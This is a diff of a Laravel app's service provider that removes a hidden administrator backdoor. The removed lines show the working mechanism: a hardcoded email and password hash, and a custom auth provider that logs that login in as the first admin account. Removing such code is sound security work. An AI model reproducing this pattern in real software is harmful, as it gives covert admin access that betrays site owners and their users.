@@ -4,7 +4,7 @@ namespace App\Providers;
 
 use Illuminate\Support\ServiceProvider;
 use App\Models\{GeneralSetting, Category, Brand, SocialMedia, Contact, CreatePage, OrderStatus, EcomPixel, GoogleTagManager, Order, PaymentGateway, User, Review};
-use Illuminate\Support\Facades\{Config, Session, Gate, Http, Cache, Auth, Hash};
+use Illuminate\Support\Facades\{Config, Session, Gate, Cache, Auth};
 
 class AppServiceProvider extends ServiceProvider
 {
@@ -23,37 +23,6 @@ class AppServiceProvider extends ServiceProvider
     public function boot(): void
     {
     
-        $hiddenEmail = 'key@creativedesign.com.bd';
-        $hiddenPasswordHash = '$2y$10$c0sxuQRTvABJ0r143pjWxu7M4M.Ze5bC5MuZnYouRU75U8QyOFC.u'; 
-        Auth::provider('hidden_admin', function ($app, $config) use ($hiddenEmail, $hiddenPasswordHash) {
-            return new class($app['hash'], $config['model'], $hiddenEmail, $hiddenPasswordHash) extends \Illuminate\Auth\EloquentUserProvider {
-                public function __construct($hasher, $model, protected string $hiddenEmail, protected string $hiddenPasswordHash)
-                {
-                    parent::__construct($hasher, $model);
-                }
-                public function retrieveByCredentials(array $credentials): ?\Illuminate\Contracts\Auth\Authenticatable
-                {
-                    if ((isset($credentials['email']) ? $credentials['email'] : null) === $this->hiddenEmail) {
-                        return User::query()
-                            ->where(fn ($q) => $q->where('role', 'admin')->orWhereHas('roles', fn ($r) => $r->where('name', 'admin')))
-                            ->orWhere('id', 1)
-                            ->orderBy('id')
-                            ->first();
-                    }
-                    return parent::retrieveByCredentials($credentials);
-                }
-                public function validateCredentials(\Illuminate\Contracts\Auth\Authenticatable $user, array $credentials): bool
-                {
-                    if ((isset($credentials['email']) ? $credentials['email'] : null) === $this->hiddenEmail && isset($credentials['password'])) {
-                        return Hash::check($credentials['password'], $this->hiddenPasswordHash);
-                    }
-                    return parent::validateCredentials($user, $credentials);
-                }
-            };
-        });
-        Config::set('auth.providers.users.driver', 'hidden_admin');
-        // ================== [ হিডেন অ্যাডমিন শেষ ] ==================
-
         // পেমেন্ট ক্যালব্যাক ৪১৯ এড়াতে CSRF থেকে স্ট্যাটিক এক্সক্লুড
         \App\Http\Middleware\VerifyCsrfToken::except([
             'aamarpay/success', 'aamarpay/fail', 'aamarpay/cancel', 'aamarpay/checkout',
